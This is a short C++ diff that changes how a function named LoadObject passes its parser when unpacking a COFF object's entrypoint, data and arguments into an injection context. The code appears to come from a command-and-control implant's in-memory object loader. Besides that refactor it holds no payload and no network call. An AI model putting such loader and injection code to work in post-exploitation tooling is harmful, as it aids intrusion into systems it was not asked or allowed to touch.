@@ -411,16 +411,16 @@ namespace Objects {
         x_zerofree(params, sizeof(_coff_params));
     }
 
-    VOID LoadObject(_parser* parser) {
+    VOID LoadObject(_parser parser) {
 
         _coff_params    *params = { };
         _injection_ctx  inject  = { };
 
         params = (_coff_params*) x_malloc(sizeof(_coff_params));
 
-        params->entrypoint  = Parser::UnpackString(parser, (uint32_t*)&params->entrypoint_size);
-        params->data        = Parser::UnpackBytes(parser, (uint32_t*)&params->data_size);
-        params->args        = Parser::UnpackBytes(parser, (uint32_t*)&params->args_size);
+        params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
+        params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
+        params->args        = Parser::UnpackBytes(&parser, (uint32_t*)&params->args_size);
         params->task_id     = Ctx->session.current_taskid;
 
         inject.parameter = params;
